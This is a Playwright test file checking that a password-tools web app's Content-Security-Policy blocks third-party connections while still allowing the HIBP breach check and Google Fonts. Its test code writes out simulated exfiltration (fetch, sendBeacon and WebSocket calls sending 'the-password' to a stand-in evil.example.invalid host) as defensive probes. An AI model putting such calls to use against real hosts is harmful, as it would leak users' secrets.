import { expect, test } from "@playwright/test";

/**
 * Issue #81: the client document must be served with a Content-Security-Policy
 * that actually enforces ADR-0007 — an injected exfiltration to a third-party
 * origin has to be blocked by the browser, not merely unobserved (cf. #80).
 *
 * These run against the Vite dev server, so they exercise the *dev* policy
 * (`csp.mjs` DEV_CSP). The dev policy is deliberately looser than production
 * only for inline script/style and the HMR socket; its `connect-src`
 * third-party allowlist is identical to production's, and that is the directive
 * under test here. `csp.test.ts` pins the production policy and the deployed
 * `staticwebapp.config.json` to the same allowlist.
 */

const HIBP_SUFFIX = "003D68EB55068C33ACE09247EE4C639306B"; // arbitrary miss
const EVIL = "https://evil.example.invalid";

test.describe("client CSP (#81)", () => {
  test("the document is served with a locked-down connect-src", async ({
    page,
  }) => {
    const response = await page.goto("/");
    const csp = response?.headers()["content-security-policy"] ?? "";

    expect(csp).toContain("connect-src 'self' https://api.pwnedpasswords.com");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).not.toContain("evil.example");
  });

  test("blocks an injected fetch / sendBeacon / WebSocket to a third-party origin", async ({
    page,
  }) => {
    // Anything that actually leaves the browser for evil.example.invalid would
    // show up here. Under the CSP nothing should — the requests never start.
    const reachedNetwork: string[] = [];
    page.on("request", (request) => {
      if (request.url().includes("evil.example.invalid")) {
        reachedNetwork.push(request.url());
      }
    });

    await page.goto("/password-tools");

    const result = await page.evaluate(async (evil) => {
      const violations: { directive: string; blockedURI: string }[] = [];
      const onViolation = (event: SecurityPolicyViolationEvent) => {
        violations.push({
          directive: event.effectiveDirective || event.violatedDirective,
          blockedURI: event.blockedURI,
        });
      };
      document.addEventListener("securitypolicyviolation", onViolation);

      let fetchBlocked = false;
      try {
        await fetch(`${evil}/steal`, {
          method: "POST",
          body: "the-password",
          mode: "no-cors",
        });
      } catch {
        fetchBlocked = true;
      }

      // Chromium's sendBeacon returns true optimistically (it "queued" the
      // transfer); the CSP then blocks the actual send and fires a violation.
      // The return value is not the proof — the violation and the absence of a
      // network request are.
      navigator.sendBeacon(`${evil}/beacon`, "the-password");

      let socketThrew = false;
      try {
        const probe = new WebSocket(evil.replace("https:", "wss:"));
        probe.close();
      } catch {
        socketThrew = true;
      }

      await new Promise((resolve) => setTimeout(resolve, 250));
      document.removeEventListener("securitypolicyviolation", onViolation);
      return { fetchBlocked, socketThrew, violations };
    }, EVIL);

    // The fetch rejected rather than completing…
    expect(result.fetchBlocked).toBe(true);

    // …the reason is the CSP, specifically connect-src, not a DNS failure…
    const connectViolations = result.violations.filter(
      (v) => v.directive === "connect-src",
    );
    expect(connectViolations.length).toBeGreaterThan(0);
    expect(
      connectViolations.every((v) =>
        v.blockedURI.includes("evil.example.invalid"),
      ),
    ).toBe(true);

    // …and nothing for that origin ever hit the network.
    expect(reachedNetwork).toEqual([]);
  });

  test("still lets the breach check reach HIBP", async ({ page }) => {
    await page.route("https://api.pwnedpasswords.com/**", (route) =>
      route.fulfill({
        status: 200,
        contentType: "text/plain",
        body: `${HIBP_SUFFIX}:0`,
      }),
    );

    await page.goto("/password-tools");
    await page.getByLabel("Password to check").fill("some-password-to-check");
    await page.getByRole("button", { name: "Check password" }).click();

    // A verdict only appears if the fetch to api.pwnedpasswords.com was allowed
    // through the CSP and reached the route handler.
    await expect(page.getByText("Not found in known breaches")).toBeVisible();
  });

  test("raises no CSP violation on any current route, and loads the web fonts", async ({
    page,
  }) => {
    const violations: string[] = [];
    page.on("console", (message) => {
      const text = message.text();
      if (/content security policy|Refused to/i.test(text)) {
        violations.push(text);
      }
    });
    page.on("pageerror", (error) => violations.push(String(error)));

    for (const route of [
      "/",
      "/dashboard",
      "/password-tools",
      "/learn/password-privacy",
      "/dev/kit",
    ]) {
      await page.goto(route);
      await page.waitForLoadState("networkidle");
    }

    expect(violations).toEqual([]);

    // The Google Fonts stylesheet loaded, i.e. style-src / font-src allow it.
    const fontStylesheetLoaded = await page.evaluate(() =>
      [...document.styleSheets].some((sheet) =>
        (sheet.href ?? "").startsWith("https://fonts.googleapis.com"),
      ),
    );
    expect(fontStylesheetLoaded).toBe(true);
  });
});
